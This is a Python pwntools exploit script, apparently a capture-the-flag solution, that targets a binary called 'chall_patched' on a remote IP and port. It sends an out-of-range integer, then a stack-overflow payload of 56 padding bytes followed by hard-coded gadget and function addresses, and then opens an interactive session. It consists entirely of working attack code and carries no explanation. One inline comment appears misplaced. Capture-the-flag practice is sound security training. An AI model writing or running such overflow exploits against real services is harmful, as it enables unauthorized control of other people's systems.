#!/usr/bin/env python3

import time

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path], gdbscript="init-peda")
    else:
        r = remote("54.179.211.23", 11102)

    return r


def main():
    r = conn()

    padding = 56
    payload = flat(
        [
            b"\x90" * padding,
            p64(0x0000000000400C43),  # type = import pwnlib.util.packing
            p64(0x19B6DA8F2BDCB1EE),
            p64(0x0000000000400951),
        ]
    )

    r.sendline(b"4")
    r.sendlineafter(b": ", b"-99999999999999999999999999")
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.sendlineafter(b"? ", payload)
    r.sendlineafter(b"> ", b"5")

    r.interactive()


if __name__ == "__main__":
    main()
